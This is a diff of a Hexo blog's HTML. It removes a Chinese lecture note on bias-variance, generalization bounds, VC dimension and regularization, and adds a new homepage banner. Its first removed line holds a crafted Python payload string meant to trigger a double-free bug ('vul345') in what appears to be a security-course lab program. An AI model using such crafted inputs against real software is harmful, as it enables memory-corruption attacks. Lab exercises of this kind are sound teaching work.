-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload6_double_free = <span class="string">&quot;a&quot;</span>*<span class="number">23</span>+<span class="string">&quot;%&quot;</span>*<span class="number">1</span>+<span class="string">&quot;a&quot;</span>*<span class="number">54</span>+<span class="string">&quot;b&quot;</span>+<span class="string">&quot;a&quot;</span>+<span class="string">&quot;youarethebest&quot;</span>       <span class="comment">#触发vul345</span></span><br></pre></td></tr></table></figure>
+  
+</div>
 
+        </div>
+      </header>
 
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <!-- 首屏大图欢迎语 -->
+<div class="hero">
+  <h1 class="hero-title">欢迎来到我的技术博客</h1>
+  <p class="hero-subtitle">这里分享Web开发 | 云原生 | 自动化运维</p>
+</div>
+
+<style>
+  /* 自定义首屏样式 */
+  .hero {
+    text-align: center;
+    padding: 4rem 1rem;
+    background: var(--card-bg-color);
+    border-radius: 16px;
+    margin: 2rem 0;
+    box-shadow: var(--card-shadow);
+  }
+  .hero-title {
+    font-size: 2.5rem;
+    margin-bottom: 1rem;
+  }
+  .hero-subtitle {
+    color: var(--text-color-secondary);
+    font-size: 1.2rem;
+  }
+</style>
+
+<!-- 两栏布局 -->
+<div class="columns">
+
+  <!-- 左栏：个人简介 -->
+  <div class="column is-two-thirds">
+    <details class="note success"><summary><p>modern</p>
+</summary>
+<h2 id="👋-关于我"><a href="#👋-关于我" class="headerlink" title="👋 关于我"></a>👋 关于我</h2><ul>
+<li>全栈开发者 | DevOps工程师</li>
+<li>技术栈：C&#x2F;C++ &#x2F;Python&#x2F;Linux</li>
+</ul>
+
+</details>
+
+<pre><code>&#123;% note info modern %&#125;
+    ## 📌 置顶文章
+    &#123;% endnote %&#125;
+</code></pre>
+  </div>
+
+  <!-- 右栏：社交链接 -->
+  <div class="column">
+    <div class="card">
+      <div class="card-content">
+        <h2>🔗 找到我</h2>
+        <div class="social-links">
+          <a href="https://github.com/yourname" target="_blank" rel="noopener">
+            <i class="fab fa-github"></i> GitHub
+          </a>
+          <a href="/about">
+            <i class="fas fa-user-circle"></i> 关于页面
+          </a>
+        </div>
+      </div>
+    </div>
+    
+<pre><code>&lt;!-- 技术栈标签云 --&gt;
+&lt;div class=&quot;tag-cloud&quot; style=&quot;margin-top: 2rem;&quot;&gt;
+  &lt;h2&gt;🛠 技术栈&lt;/h2&gt;
+  &lt;a class=&quot;tag-button&quot; href=&quot;/tags/Golang/&quot;&gt;Golang&lt;/a&gt;
+  &lt;a class=&quot;tag-button&quot; href=&quot;/tags/Kubernetes/&quot;&gt;Kubernetes&lt;/a&gt;
+  &lt;a class=&quot;tag-button&quot; href=&quot;/tags/Python/&quot;&gt;Python&lt;/a&gt;
+&lt;/div&gt;
+</code></pre>
+  </div>
+
+</div>
+
+<style>
+  /* 卡片样式 */
+  .card {
+    background: var(--card-bg-color);
+    border-radius: 12px;
+    padding: 1.5rem;
+    box-shadow: var(--card-shadow);
+  }
+  
+  /* 标签按钮样式 */
+  .tag-button {
+    display: inline-block;
+    padding: 4px 12px;
+    margin: 4px;
+    background: var(--btn-default-bg);
+    border-radius: 20px;
+    transition: transform 0.2s;
+  }
+  .tag-button:hover {
+    transform: translateY(-2px);
+  }
+</style>
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/02/21/%E4%BF%A1%E6%81%AF%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/" data-id="cm7e2695o0003p0tx8gfu4qmz" data-title="信息与网络安全课程设计" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
       
     </footer>
-  </div>
-  
-</article>
+  </article>
+</div>
 
 
 
-  
-    <article id="post-Lecture9" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/02/13/Lecture9/" class="article-date">
-  <time class="dt-published" datetime="2025-02-13T11:34:46.000Z" itemprop="datePublished">2025-02-13</time>
-</a>
+
     
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">机器学习</a>
-  </div>
 
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
+
+<div class="post-block">
   
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/02/13/Lecture9/">Lecture9</a>
-    </h1>
   
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/21/%E4%BF%A1%E6%81%AF%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/21/%E4%BF%A1%E6%81%AF%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/" class="post-title-link" itemprop="url">信息与网络安全课程设计</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
       
-        <h1 id="偏差-方差"><a href="#偏差-方差" class="headerlink" title="偏差-方差"></a>偏差-方差</h1><p>测试误差分解为”bias”和”variance”项, 并研究它们中的每一个是如何受到模型参数化选择及其权衡的影响的。使用偏差-方差权衡, 我们将讨论何时会发生过拟合和欠拟合并避免。</p>
-<p>测试误差和训练误差之间的差异通常被称为泛化差距。</p>
-<p>通常, 在偏差和方差之间存在权衡。如果我们的模型太“简单”并且参数很少, 那么它可能会有很大的偏差（但方差很小）, 并且它通常会遭受欠拟合。如果它太“复杂”并且有很多参数, 那么它可能会受到大方差的影响（但偏差较小）, 从而导致过拟合。偏差和方差之间的典型权衡如下<br><img src="/2025/02/13/Lecture9/image.png" alt="alt text"><br><strong>图8.8 偏差-方差权衡曲线</strong><br>偏差-方差权衡曲线或测试误差曲线并不普遍地遵循图8.8的形状, 至少在简单地通过参数数量来衡量模型复杂性时不是普遍的。</p>
-<h2 id="二次下降现象"><a href="#二次下降现象" class="headerlink" title="二次下降现象"></a>二次下降现象</h2><h3 id="模型双下降"><a href="#模型双下降" class="headerlink" title="模型双下降"></a>模型双下降</h3><ul>
-<li><strong>传统观点</strong>：随着模型复杂度的增加, 测试误差先减小（欠拟合区域）, 然后增大（过拟合区域）, 形成一个U形曲线。</li>
-<li><strong>双下降现象</strong>：在模型复杂度非常高时, 测试误差会再次下降, 形成第二个下降区域, 称为“双下降”。</li>
-</ul>
-<p><img src="/2025/02/13/Lecture9/image9_2.png" alt="alt text"></p>
-<h3 id="逐样本双下降"><a href="#逐样本双下降" class="headerlink" title="逐样本双下降"></a>逐样本双下降</h3><p>随着样本量的增加, 测试误差并不是单调递减的。相反, 如图9_3所示, 测试误差先减小, 然后增大, 并在示例数量（由n表示）与参数数量（由d表示）相似时达到峰值, 然后再次减小。我们称之为样本双下降现象。<br>当n≈d时, 还有其他算法可以实现较小的测试误差, 但这些实验中评估的算法未能做到这一点。<br>事实上, 可以通过优化正则化, n≈d区域的测试误差可以得到显著改善, 模型和样本双下降都得到了缓解<br><img src="/2025/02/13/Lecture9/image9_3.png" alt="alt text"></p>
-<h2 id="样本复杂性界限"><a href="#样本复杂性界限" class="headerlink" title="样本复杂性界限"></a>样本复杂性界限</h2><h3 id="切尔诺夫界（Chernoff-Bound）-霍夫丁不等式"><a href="#切尔诺夫界（Chernoff-Bound）-霍夫丁不等式" class="headerlink" title="切尔诺夫界（Chernoff Bound）&#x2F;霍夫丁不等式"></a>切尔诺夫界（Chernoff Bound）&#x2F;霍夫丁不等式</h3><p>切尔诺夫界是概率论中的一个重要不等式，用于描述独立同分布（i.i.d.）随机变量的均值与其期望值之间偏差的概率上界。以下是其定义和应用：</p>
-<hr>
-<h4 id="1-问题设定"><a href="#1-问题设定" class="headerlink" title="1. 问题设定"></a><strong>1. 问题设定</strong></h4><ul>
-<li>设 ( Z_1, Z_2, \dots, Z_n ) 是 ( n ) 个独立同分布的随机变量，服从伯努利分布 ( \text{Bernoulli}(\phi) )。<ul>
-<li>( P(Z_i &#x3D; 1) &#x3D; \phi )</li>
-<li>( P(Z_i &#x3D; 0) &#x3D; 1 - \phi )</li>
-</ul>
-</li>
-<li>定义 ( \hat{\phi} &#x3D; \frac{1}{n} \sum_{i&#x3D;1}^n Z_i ) 为这些随机变量的均值。</li>
-<li>设 ( \gamma &gt; 0 ) 为任意固定常数。</li>
-</ul>
-<hr>
-<h4 id="2-切尔诺夫界（Chernoff-Bound）-霍夫丁不等式"><a href="#2-切尔诺夫界（Chernoff-Bound）-霍夫丁不等式" class="headerlink" title="2. 切尔诺夫界（Chernoff Bound）&#x2F;霍夫丁不等式"></a><strong>2. 切尔诺夫界（Chernoff Bound）&#x2F;霍夫丁不等式</strong></h4><p>切尔诺夫界给出了 ( \hat{\phi} ) 与真实值 ( \phi ) 之间偏差的概率上界：<br>$$<br>P(|\phi - \hat{\phi}| &gt; \gamma) \leq 2 \exp(-2\gamma^2 n)<br>$$</p>
-<hr>
-<h4 id="3-训练误差（Training-Error）"><a href="#3-训练误差（Training-Error）" class="headerlink" title="3. 训练误差（Training Error）"></a><strong>3. 训练误差（Training Error）</strong></h4><p>训练误差（也称为经验风险或经验误差）是模型在训练集上的错误率：<br>$$<br>\hat{\epsilon}(h) &#x3D; \frac{1}{n} \sum_{i&#x3D;1}^n \mathbb{1}{h(x^{(i)}) \neq y^{(i)}}<br>$$<br>其中：</p>
-<ul>
-<li>( \mathbb{1}{\cdot} ) 是指示函数，当条件成立时取值为 1，否则为 0。</li>
-<li>( n ) 是训练样本的数量。</li>
-</ul>
-<hr>
-<h4 id="4-泛化误差（Generalization-Error）"><a href="#4-泛化误差（Generalization-Error）" class="headerlink" title="4. 泛化误差（Generalization Error）"></a><strong>4. 泛化误差（Generalization Error）</strong></h4><p>泛化误差是模型在分布 ( D ) 上的期望错误率，反映了模型在未见数据上的表现：<br>$$<br>\epsilon(h) &#x3D; P_{(x,y) \sim D}(h(x) \neq y)<br>$$<br>其中：</p>
-<ul>
-<li>( (x, y) ) 是从分布 ( D ) 中抽取的新样本。</li>
-</ul>
-<hr>
-<h4 id="4-PAC-假设"><a href="#4-PAC-假设" class="headerlink" title="4. PAC 假设"></a><strong>4. PAC 假设</strong></h4><ul>
-<li>假设训练数据和测试数据来自相同的分布 ( D )，这是 PAC（Probably Approximately Correct）学习理论中的一个基本假设。</li>
-<li>这一假设确保了训练误差能够有效反映泛化误差。</li>
-</ul>
-<hr>
-<h3 id="偏差-方差分解（Bias-Variance-Decomposition）"><a href="#偏差-方差分解（Bias-Variance-Decomposition）" class="headerlink" title="偏差-方差分解（Bias-Variance Decomposition）"></a>偏差-方差分解（Bias-Variance Decomposition）</h3><p>在机器学习中, 偏差-方差分解是一种用于分析模型预测误差的方法。它将误差分解为三个部分：不可避免的噪声、偏差和方差。</p>
-<hr>
-<h4 id="1-误差分解公式"><a href="#1-误差分解公式" class="headerlink" title="1. 误差分解公式"></a><strong>1. 误差分解公式</strong></h4><p>对于给定的输入 ( x ), 均方误差（MSE）可以分解为：<br>$$<br>\text{MSE}(x) &#x3D; \sigma^2 + \text{Bias}^2 + \text{Variance}<br>$$<br>其中：</p>
-<ul>
-<li>( \sigma^2 )：<strong>不可避免的噪声</strong>, 表示数据中的随机噪声, 无法通过模型预测。</li>
-<li>( \text{Bias}^2 )：<strong>偏差的平方</strong>, 表示模型预测值与真实值之间的系统性误差。</li>
-<li>( \text{Variance} )：<strong>方差</strong>, 表示模型对训练数据的随机性敏感程度。</li>
-</ul>
-<hr>
-<h4 id="2-偏差（Bias）"><a href="#2-偏差（Bias）" class="headerlink" title="2. 偏差（Bias）"></a><strong>2. 偏差（Bias）</strong></h4><ul>
-<li><strong>定义</strong>：偏差是模型预测值的期望与真实值之间的差异：<br>$$<br>\text{Bias} &#x3D; h^*(x) - h_{\text{avg}}(x)<br>$$<br>其中：<ul>
-<li>( h^*(x) ) 是真实值。</li>
-<li>( h_{\text{avg}}(x) ) 是模型在无限数据集上的平均预测值。</li>
-</ul>
-</li>
-<li><strong>含义</strong>：偏差反映了模型由于表达能力不足而引入的系统性误差。即使有无限数据, 偏差仍然存在。</li>
-</ul>
-<hr>
-<h4 id="3-方差（Variance）"><a href="#3-方差（Variance）" class="headerlink" title="3. 方差（Variance）"></a><strong>3. 方差（Variance）</strong></h4><ul>
-<li><strong>定义</strong>：方差是模型预测值在不同数据集上的波动：<br>$$<br>\text{Variance} &#x3D; \mathbb{E}[(h_{\text{avg}}(x) - h_S(x))^2]<br>$$<br>其中：<ul>
-<li>( h_S(x) ) 是模型在特定数据集 ( S ) 上的预测值。</li>
-</ul>
-</li>
-<li><strong>含义</strong>：方差反映了模型对训练数据随机性的敏感程度。随着数据集规模的增加, 方差通常会减小。</li>
-</ul>
-<hr>
-<h4 id="4-噪声（Noise）"><a href="#4-噪声（Noise）" class="headerlink" title="4. 噪声（Noise）"></a><strong>4. 噪声（Noise）</strong></h4><ul>
-<li><strong>定义</strong>：噪声是数据中无法预测的随机误差：<br>$$<br>\sigma^2 &#x3D; \text{Var}(\xi)<br>$$<br>其中 ( \xi ) 是噪声项。</li>
-<li><strong>含义</strong>：噪声是不可避免的, 因为它与模型的表达能力无关。</li>
-</ul>
-<hr>
-<h4 id="5-偏差-方差的权衡"><a href="#5-偏差-方差的权衡" class="headerlink" title="5. 偏差-方差的权衡"></a><strong>5. 偏差-方差的权衡</strong></h4><ul>
-<li><strong>高偏差</strong>：模型过于简单, 无法捕捉数据的真实分布, 导致欠拟合（underfitting）。</li>
-<li><strong>高方差</strong>：模型过于复杂, 对训练数据的随机性过于敏感, 导致过拟合（overfitting）。</li>
-<li><strong>目标</strong>：通过调整模型复杂度, 找到偏差和方差之间的最佳平衡点。</li>
-</ul>
-<hr>
-<h4 id="6-分类问题中的偏差-方差分解"><a href="#6-分类问题中的偏差-方差分解" class="headerlink" title="6. 分类问题中的偏差-方差分解"></a><strong>6. 分类问题中的偏差-方差分解</strong></h4><ul>
-<li>与回归问题相比, 分类问题中的偏差-方差分解更加复杂。</li>
-<li>目前尚无统一的分解方法, 不同的研究提出了不同的形式化方法。</li>
-</ul>
-<hr>
-<h1 id="经验风险最小化（Empirical-Risk-Minimization-ERM）"><a href="#经验风险最小化（Empirical-Risk-Minimization-ERM）" class="headerlink" title="经验风险最小化（Empirical Risk Minimization, ERM）"></a>经验风险最小化（Empirical Risk Minimization, ERM）</h1><h2 id="经验风险最小化是机器学习中最基本的学习算法之一，其目标是通过最小化训练误差来拟合模型参数。"><a href="#经验风险最小化是机器学习中最基本的学习算法之一，其目标是通过最小化训练误差来拟合模型参数。" class="headerlink" title="经验风险最小化是机器学习中最基本的学习算法之一，其目标是通过最小化训练误差来拟合模型参数。"></a>经验风险最小化是机器学习中最基本的学习算法之一，其目标是通过最小化训练误差来拟合模型参数。</h2><h2 id="1-基本假设"><a href="#1-基本假设" class="headerlink" title="1. 基本假设"></a><strong>1. 基本假设</strong></h2><ul>
-<li><strong>同分布假设</strong>：训练数据和测试数据来自相同的分布 ( D )，这是 PAC（Probably Approximately Correct）学习理论中的一个重要假设。</li>
-<li><strong>独立同分布（i.i.d.）</strong>：训练样本是独立同分布的。</li>
-</ul>
-<hr>
-<h2 id="2-线性分类问题"><a href="#2-线性分类问题" class="headerlink" title="2. 线性分类问题"></a><strong>2. 线性分类问题</strong></h2><ul>
-<li>假设模型为线性分类器：<br>$$<br>h_\theta(x) &#x3D; \mathbb{1}{\theta^T x \geq 0}<br>$$<br>其中 ( \theta ) 是模型参数。</li>
-<li><strong>参数拟合方法</strong>：通过最小化训练误差来找到最优参数：<br>$$<br>\hat{\theta} &#x3D; \arg\min_\theta \hat{\epsilon}(h_\theta)<br>$$<br>其中 ( \hat{\epsilon}(h_\theta) ) 是训练误差。</li>
-</ul>
-<hr>
-<h2 id="3-经验风险最小化（ERM）"><a href="#3-经验风险最小化（ERM）" class="headerlink" title="3. 经验风险最小化（ERM）"></a><strong>3. 经验风险最小化（ERM）</strong></h2><ul>
-<li><strong>定义</strong>：ERM 是通过最小化训练误差来学习模型参数的过程：<br>$$<br>\hat{h} &#x3D; h_{\hat{\theta}}<br>$$<br>其中 ( \hat{h} ) 是学习算法输出的假设。</li>
-<li><strong>直观解释</strong>：ERM 是最基本的学习算法，目标是使模型在训练集上的表现最优。</li>
-<li><strong>扩展</strong>：许多算法（如逻辑回归）可以看作是 ERM 的近似。</li>
-</ul>
-<hr>
-<h2 id="4-假设类（Hypothesis-Class）"><a href="#4-假设类（Hypothesis-Class）" class="headerlink" title="4. 假设类（Hypothesis Class）"></a><strong>4. 假设类（Hypothesis Class）</strong></h2><p>这里可以看一下讲义的对应内容，讲义对应内容大概讲解了假设类和打散 shatter</p>
-<ul>
-<li><strong>定义</strong>：假设类 ( H ) 是学习算法考虑的所有分类器的集合。<ul>
-<li>对于线性分类问题：<br>$$<br>H &#x3D; {h_\theta : h_\theta(x) &#x3D; \mathbb{1}{\theta^T x \geq 0}, \theta \in \mathbb{R}^{d+1}}<br>$$<br>即所有线性分类器的集合。</li>
-<li>对于神经网络，( H ) 可以是某种网络结构表示的所有分类器的集合。</li>
-</ul>
-</li>
-<li><strong>ERM 的抽象形式</strong>：ERM 可以看作是在假设类 ( H ) 上的最小化问题：<br>$$<br>\hat{h} &#x3D; \arg\min_{h \in H} \hat{\epsilon}(h)<br>$$</li>
-</ul>
-<h3 id="有限假设类下的学习理论"><a href="#有限假设类下的学习理论" class="headerlink" title="有限假设类下的学习理论"></a>有限假设类下的学习理论</h3><p>当假设类 ( H ) 是有限的时候，我们可以通过概率工具（如霍夫丁不等式和联合界）来推导泛化误差的界。以下是核心内容和推导过程的总结：</p>
-<hr>
-<h4 id="1-问题设定-1"><a href="#1-问题设定-1" class="headerlink" title="1. 问题设定"></a><strong>1. 问题设定</strong></h4><ul>
-<li>假设类 ( H &#x3D; {h_1, h_2, \dots, h_k} ) 是有限的，包含 ( k ) 个假设。</li>
-<li>每个假设 ( h_i ) 是从输入空间 ( X ) 到输出空间 ({0, 1}) 的映射。</li>
-<li>经验风险最小化（ERM）选择训练误差最小的假设 ( \hat{h} )。</li>
-</ul>
-<hr>
-<h4 id="2-训练误差与泛化误差的关系"><a href="#2-训练误差与泛化误差的关系" class="headerlink" title="2. 训练误差与泛化误差的关系"></a><strong>2. 训练误差与泛化误差的关系</strong></h4><ul>
-<li>对于任意固定的假设 ( h_i )，定义随机变量 ( Z &#x3D; \mathbb{1}{h_i(x) \neq y} )，其中 ( (x, y) \sim D )。</li>
-<li>训练误差 ( \hat{\epsilon}(h_i) ) 是 ( n ) 个独立同分布的 ( Z_j ) 的均值：<br>$$<br>\hat{\epsilon}(h_i) &#x3D; \frac{1}{n} \sum_{j&#x3D;1}^n Z_j<br>$$</li>
-<li>泛化误差 ( \epsilon(h_i) ) 是 ( Z ) 的期望值：<br>$$<br>\epsilon(h_i) &#x3D; \mathbb{E}[Z]<br>$$</li>
-</ul>
-<hr>
-<h4 id="3-霍夫丁不等式"><a href="#3-霍夫丁不等式" class="headerlink" title="3. 霍夫丁不等式"></a><strong>3. 霍夫丁不等式</strong></h4><ul>
-<li>对于任意固定的 ( h_i )，霍夫丁不等式给出了训练误差与泛化误差之间偏差的概率上界：<br>$$<br>P(|\epsilon(h_i) - \hat{\epsilon}(h_i)| &gt; \gamma) \leq 2 \exp(-2\gamma^2 n)<br>$$</li>
-</ul>
-<hr>
-<h4 id="4-联合界与一致收敛"><a href="#4-联合界与一致收敛" class="headerlink" title="4. 联合界与一致收敛"></a><strong>4. 联合界与一致收敛</strong></h4><ul>
-<li>定义事件 ( A_i ) 为 ( |\epsilon(h_i) - \hat{\epsilon}(h_i)| &gt; \gamma )。</li>
-<li>使用联合界，对所有 ( h \in H ) 的偏差概率进行约束：<br>$$<br>P(\exists h \in H: |\epsilon(h) - \hat{\epsilon}(h)| &gt; \gamma) \leq 2k \exp(-2\gamma^2 n)<br>$$</li>
-<li>因此，一致收敛的概率为：<br>$$<br>P(\forall h \in H: |\epsilon(h) - \hat{\epsilon}(h)| \leq \gamma) \geq 1 - 2k \exp(-2\gamma^2 n)<br>$$</li>
-</ul>
-<hr>
-<h4 id="5-样本复杂度"><a href="#5-样本复杂度" class="headerlink" title="5. 样本复杂度"></a><strong>5. 样本复杂度</strong></h4><ul>
-<li>给定 ( \gamma ) 和 ( \delta &gt; 0 )，为了以至少 ( 1 - \delta ) 的概率保证一致收敛，所需的样本量 ( n ) 为：<br>$$<br>n \geq \frac{1}{2\gamma^2} \log \frac{2k}{\delta}<br>$$</li>
-<li>样本复杂度 ( n ) 与假设类大小 ( k ) 呈对数关系，这是该理论的关键性质。</li>
-</ul>
-<hr>
-<h4 id="6-泛化误差的界"><a href="#6-泛化误差的界" class="headerlink" title="6. 泛化误差的界"></a><strong>6. 泛化误差的界</strong></h4><ul>
-<li>定义 ( h^* &#x3D; \arg\min_{h \in H} \epsilon(h) ) 为假设类 ( H ) 中最优假设。</li>
-<li>如果一致收敛成立，则 ERM 选择的假设 ( \hat{h} ) 的泛化误差满足：<br>$$<br>\epsilon(\hat{h}) \leq \epsilon(h^*) + 2\gamma<br>$$</li>
-<li>这表明，( \hat{h} ) 的泛化误差最多比最优假设 ( h^* ) 差 ( 2\gamma )。</li>
-</ul>
-<hr>
-<h4 id="7-定理总结"><a href="#7-定理总结" class="headerlink" title="7. 定理总结"></a><strong>7. 定理总结</strong></h4><ul>
-<li><strong>定理</strong>：对于有限假设类 ( H )（( |H| &#x3D; k )），给定 ( n ) 和 ( \delta )，以至少 ( 1 - \delta ) 的概率，有：<br>$$<br>\epsilon(\hat{h}) \leq \left(\min_{h \in H} \epsilon(h)\right) + 2\sqrt{\frac{1}{2n} \log \frac{2k}{\delta}}<br>$$</li>
-<li><strong>推论</strong>：给定 ( \delta ) 和 ( \gamma )，为了满足 ( \epsilon(\hat{h}) \leq \min_{h \in H} \epsilon(h) + 2\gamma )，所需的样本量为：<br>$$<br>n &#x3D; O\left(\frac{1}{\gamma^2} \log \frac{k}{\delta}\right)<br>$$</li>
-</ul>
-<hr>
-<h4 id="8-偏差-方差权衡"><a href="#8-偏差-方差权衡" class="headerlink" title="8. 偏差-方差权衡"></a><strong>8. 偏差-方差权衡</strong></h4><ul>
-<li>当假设类 ( H ) 增大时：<ul>
-<li><strong>偏差</strong>（第一项 ( \min_{h \in H} \epsilon(h) )）会减小，因为优化空间更大。</li>
-<li><strong>方差</strong>（第二项 ( 2\sqrt{\frac{1}{2n} \log \frac{2k}{\delta}} )）会增大，因为假设类大小 ( k ) 增加。</li>
-</ul>
-</li>
-<li>这体现了模型选择中的偏差-方差权衡。</li>
-</ul>
-<hr>
-<h3 id="无限假设类"><a href="#无限假设类" class="headerlink" title="无限假设类"></a>无限假设类</h3><h4 id="VC维与泛化误差"><a href="#VC维与泛化误差" class="headerlink" title="VC维与泛化误差"></a>VC维与泛化误差</h4><p>在机器学习理论中，VC维（Vapnik-Chervonenkis dimension）是衡量假设类（hypothesis class）复杂度的重要工具。</p>
-<h5 id="基于VC维的核心结论："><a href="#基于VC维的核心结论：" class="headerlink" title="基于VC维的核心结论："></a>基于VC维的核心结论：</h5><ol>
-<li><p><strong>VC维的定义</strong>：</p>
-<ul>
-<li>为了证明假设类 ( H ) 的VC维至少为 ( D )，只需证明存在一个大小为 ( D ) 的数据集能够被 ( H ) 打散（shatter）。</li>
-</ul>
-</li>
-<li><p><strong>Vapnik定理</strong>：</p>
-<ul>
-<li>假设 ( H ) 的VC维为 ( D )，则在概率至少为 ( 1 - \delta ) 的情况下，对于所有 ( h \in H )，泛化误差 ( \epsilon(h) ) 和训练误差 ( \hat{\epsilon}(h) ) 之间的差距满足：<br>[<br>|\epsilon(h) - \hat{\epsilon}(h)| \leq O\left(\sqrt{\frac{D}{n} \log \frac{n}{D} + \frac{1}{n} \log \frac{1}{\delta}}\right)<br>]</li>
-<li>这意味着，随着样本数量 ( n ) 的增加，泛化误差会逐渐收敛。</li>
-</ul>
-</li>
-<li><p><strong>推论</strong>：</p>
-<ul>
-<li>为了确保 ( |\epsilon(h) - \hat{\epsilon}(h)| \leq \gamma ) 对所有 ( h \in H ) 成立（即 ( \hat{\epsilon}(h) \leq \epsilon(h^*) + 2\gamma )），所需的训练样本数量 ( n ) 与VC维 ( D ) 成线性关系，即：<br>[<br>n &#x3D; O_{\gamma,\delta}(D)<br>]</li>
-</ul>
-</li>
-<li><p><strong>样本复杂度与参数数量的关系</strong>：</p>
-<ul>
-<li>对于大多数假设类，VC维与参数数量大致成线性关系。<strong>因此，为了达到接近最优分类器的泛化误差，所需的训练样本数量通常与假设类的参数数量成线性关系</strong>。</li>
-</ul>
-</li>
-</ol>
-<hr>
-<h2 id="无偏性与偏差"><a href="#无偏性与偏差" class="headerlink" title="无偏性与偏差"></a><strong>无偏性与偏差</strong></h2><ol>
-<li><p><strong>采样与目标分布</strong>：</p>
-<ul>
-<li>设采样数目为 ( M ), 数据集为 ( X ), 采样分布为 ( \hat{Y} ), 目标分布为 ( Y )。</li>
-<li>当 ( M ) 趋近于正无穷时：<br>$$<br>\lim_{M\to\infty} D(\hat{Y}) &#x3D; D(Y)<br>$$<br>即采样分布 ( \hat{Y} ) 会收敛到目标分布 ( Y )。</li>
-</ul>
-</li>
-<li><p><strong>无偏性</strong>：</p>
-<ul>
-<li>如果对于任意的 ( M ), 都有：<br>$$<br>E(\hat{Y}) &#x3D; E(Y)<br>$$<br>则学习算法是无偏的。</li>
-<li>无偏性意味着学习算法的期望预测值等于真实值。</li>
-</ul>
-</li>
-<li><p><strong>偏差（Bias）</strong>：</p>
-<ul>
-<li>偏差是模型预测值的期望与真实值之间的差异：<br>$$<br>\text{Bias} &#x3D; E(\hat{Y}) - Y<br>$$</li>
-<li>高偏差通常意味着模型欠拟合（underfitting）, 无法捕捉数据的真实分布。</li>
-</ul>
-</li>
-</ol>
-<hr>
-<h1 id="正则化"><a href="#正则化" class="headerlink" title="正则化"></a><strong>正则化</strong></h1><p>正则化是一种用于减少模型过拟合（overfitting）的技术, 通过在损失函数中添加惩罚项来限制模型复杂度。常用的正则化方法包括 L1 正则化和 L2 正则化。使用正则化相当于缩小了模型的假设空间(hypothesis space) 这种过程可能会增加模型的<strong>bias</strong>。</p>
-<h2 id="1-L1-正则化"><a href="#1-L1-正则化" class="headerlink" title="1. L1 正则化"></a><strong>1. L1 正则化</strong></h2><ol>
-<li><p><strong>定义</strong>：</p>
-<ul>
-<li>L1 正则化在损失函数中添加模型参数的绝对值之和：<br>$$<br>J(\theta) &#x3D; \text{Loss}(\theta) + \lambda \sum_{i&#x3D;1}^{n} |\theta_i|<br>$$<br>其中：<ul>
-<li>( \text{Loss}(\theta) ) 是原始损失函数。</li>
-<li>( \lambda ) 是正则化系数, 控制正则化的强度。</li>
-<li>( \theta_i ) 是模型参数。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p><strong>作用</strong>：</p>
-<ul>
-<li>L1 正则化会使得部分参数变为零, 从而实现特征选择（feature selection）。</li>
-<li>适用于稀疏模型（sparse model）, 即只有少数特征对预测结果有显著影响的情况。</li>
-</ul>
-</li>
-<li><p><strong>优点</strong>：</p>
-<ul>
-<li>可以生成稀疏解, 减少模型复杂度。</li>
-<li>适用于高维数据, 能够自动选择重要特征。</li>
-</ul>
-</li>
-<li><p><strong>缺点</strong>：</p>
-<ul>
-<li>在特征相关性较高时, 可能会随机选择其中一个特征, 而忽略其他相关特征。</li>
-</ul>
-</li>
-</ol>
-<hr>
-<h2 id="2-L2-正则化"><a href="#2-L2-正则化" class="headerlink" title="2. L2 正则化"></a><strong>2. L2 正则化</strong></h2><ol>
-<li><p><strong>定义</strong>：</p>
-<ul>
-<li>L2 正则化在损失函数中添加模型参数的平方和：<br>$$<br>J(\theta) &#x3D; \text{Loss}(\theta) + \lambda \sum_{i&#x3D;1}^{n} \theta_i^2<br>$$<br>其中：<ul>
-<li>( \text{Loss}(\theta) ) 是原始损失函数。</li>
-<li>( \lambda ) 是正则化系数, 控制正则化的强度。</li>
-<li>( \theta_i ) 是模型参数。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p><strong>作用</strong>：</p>
-<ul>
-<li>L2 正则化会使得参数值趋近于零, 但不会完全为零。</li>
-<li>适用于需要平滑模型参数的情况。</li>
-</ul>
-</li>
-<li><p><strong>优点</strong>：</p>
-<ul>
-<li>能够有效防止过拟合, 提高模型的泛化能力。</li>
-<li>对特征相关性较高的数据表现较好。</li>
-</ul>
-</li>
-<li><p><strong>缺点</strong>：</p>
-<ul>
-<li>无法生成稀疏解, 所有特征都会被保留。</li>
-</ul>
-</li>
-</ol>
-<hr>
